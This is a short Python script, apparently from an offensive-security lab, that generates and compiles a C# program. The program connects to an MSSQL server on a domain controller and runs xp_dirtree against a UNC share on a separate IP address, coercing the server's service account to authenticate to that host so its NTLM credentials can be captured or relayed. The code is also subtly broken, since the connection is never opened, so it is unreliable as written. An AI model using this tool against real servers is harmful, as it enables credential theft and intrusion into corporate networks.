#!/bin/env python3
import ak

FN_BASE = "win_sqlclient"
FN_CS = FN_BASE + ".cs"
FN_EXE = FN_BASE + ".exe"

template = r"""
using System;
using System.Data.SqlClient;
namespace SQL
{
class Program
{
static void Main(string[] args)
{
String sqlServer = "dc01.corp1.com"; String database = "master";
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
try {
Console.WriteLine("Auth success!"); }
catch
{
Console.WriteLine("Auth failed");
Environment.Exit(0); }
String query = "EXEC master..xp_dirtree \"\\\\172.16.65.152\\\\test\";";
SqlCommand command = new SqlCommand(query, con); SqlDataReader reader = command.ExecuteReader(); reader.Close();
con.Close(); }
} }

"""

ak.write_file(FN_CS, template)
ak.cs_compile(FN_CS, "/r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")
